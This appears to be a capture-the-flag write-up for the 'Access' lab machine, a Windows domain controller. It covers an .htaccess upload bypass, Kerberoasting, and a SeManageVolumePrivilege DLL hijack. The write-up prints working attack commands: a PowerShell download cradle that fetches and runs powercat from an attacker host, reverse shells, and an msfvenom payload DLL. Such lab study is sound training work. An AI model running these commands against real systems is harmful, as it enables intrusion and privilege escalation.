#Windows #ActiveDirectory #Kerberoast #FileUpload #htaccess #ExtensionBypass #SeManageVolumePrivilege #DLLHijack #RunasCs

## Overview

Access is a Windows Active Directory box on PG that chains a PHP upload filter bypass, Kerberoasting, and a `SeManageVolumePrivilege` DLL hijack. A `.htaccess` upload tricks Apache into executing arbitrary file extensions as PHP, giving a `www-data` shell. Kerberoasting from that foothold yields `svc_mssql` credentials. That account's `SeManageVolumePrivilege` enables a filesystem-wide permission reset that makes `tzres.dll` hijackable, and running `systeminfo` triggers the hijacked DLL as `NT AUTHORITY\NETWORK SERVICE`.

## Recon

### Port Scan

The open port profile confirms a Domain Controller:

```sh
PORT     STATE SERVICE VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Apache httpd 2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap         (Domain: access.offsec0.)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  tcpwrapped
3268/tcp open  ldap
5985/tcp open  wsman
```

Domain: `access.offsec`. The DC runs Apache on port 80, which is unusual and is the foothold surface.

### Web Enumeration

Gobuster found `/uploads` and `/forms`. The "buy tickets" functionality on the site presented a file upload form, the intended path for foothold.

## Foothold

### PHP Upload Filter Bypass via .htaccess

Uploading `.php` files was blocked by a backend filter. Bypassing it required two uploads:

1. A custom `.htaccess` file instructing Apache to treat a novel extension as PHP:

```sh
echo "AddType application/x-httpd-php .bypass" > .htaccess
```

2. A PHP web shell saved as `webshell.bypass`.

> **How the .htaccess bypass works:** Apache processes per-directory configuration from `.htaccess` files. The `AddType` directive maps a MIME type to a file extension, here, telling Apache to run `.bypass` files through the PHP interpreter. Upload filters typically blocklist known PHP extensions (`.php`, `.php5`, `.phtml`); a custom extension defined via `.htaccess` isn't in any standard blocklist. The two-step upload converts the filter into a no-op.

With the shell at `/uploads/webshell.bypass?cmd=`, I ran a PowerShell download cradle for a Powercat reverse shell:

```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.244:8000/powercat.ps1');powercat -c 192.168.45.208 -p 80 -e cmd"
```

Shell landed as the web server process.

## Privilege Escalation

### Kerberoasting svc_mssql

WinPEAS found `RmSvc` modifiable but that didn't pan out. Rubeus enumerated Kerberoastable accounts:

```powershell
.\Rubeus.exe kerberoast
```

One TGS hash returned for `svc_mssql`. The hash output needed whitespace stripped before cracking:

```sh
sed ':a;N;$!ba;s/[[:space:]]//g' hash.txt > clean.txt
john test.kerb --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64
‹redacted›   (svc_mssql)
```

Credentials: `svc_mssql:‹redacted›`

> **Why Kerberoasting works from any domain account:** Kerberos allows any authenticated domain principal to request a TGS ticket for any service account that has a registered SPN. The ticket is encrypted with the service account's NTLM hash, so the hash is handed to the attacker to crack offline. No lockouts, no noise on the DC. Weak service account passwords, like this one, fall in seconds.

### Lateral Move to svc_mssql with RunasCs

RunasCs executed a pre-staged MSFVenom payload under the `svc_mssql` identity:

```powershell
Invoke-RunasCs -Username svc_mssql -Password ‹redacted› -Command "shell.exe"
```

Shell caught on port 135 as `access\svc_mssql`.

### SeManageVolumePrivilege → DLL Hijack

`whoami /priv` showed `SeManageVolumePrivilege` enabled.

> **What SeManageVolumePrivilege enables:** this privilege grants the ability to perform maintenance operations on volumes, including modifying DACL entries on the filesystem. The `SeManageVolumeExploit` tool uses it to reset ACLs on `C:\Windows\System32`, giving write access to DLLs that are normally protected. It's a privilege designed for backup and disk management software; granted to a service account, it becomes a root-equivalent escalation path.

Downloaded and ran the exploit:

```powershell
.\volume.exe
Entries changed: 922
DONE
```

Generated a malicious DLL:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.244 LPORT=53 -f dll -o tzres.dll
```

Dropped `tzres.dll` into `C:\Windows\System32\wbem\`. Running `systeminfo` loads `tzres.dll` as part of timezone resolution, with the hijacked DLL in place, that triggered the reverse shell:

```sh
rlwrap nc -lvnp 53
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.187] 50437
C:\Windows\system32>whoami
nt authority\network service
```

## Root

```powershell
C:\Users\Administrator\Desktop>type proof.txt
‹redacted›
```

## Takeaways

- **`.htaccess` upload bypasses are reliable against Apache when the directory allows overrides.** Two uploads, the config and the payload, is a standard technique for any blocklist-based PHP filter.
- **Kerberoasting requires only one valid domain user session.** A web-shell process running as `www-data` on a domain-joined machine is enough to request TGS tickets.
- **`SeManageVolumePrivilege` is a high-value token privilege.** It doesn't appear in "obvious privesc" lists but enables full DACL control over `System32`, turning DLL hijacking into a reliable escalation.
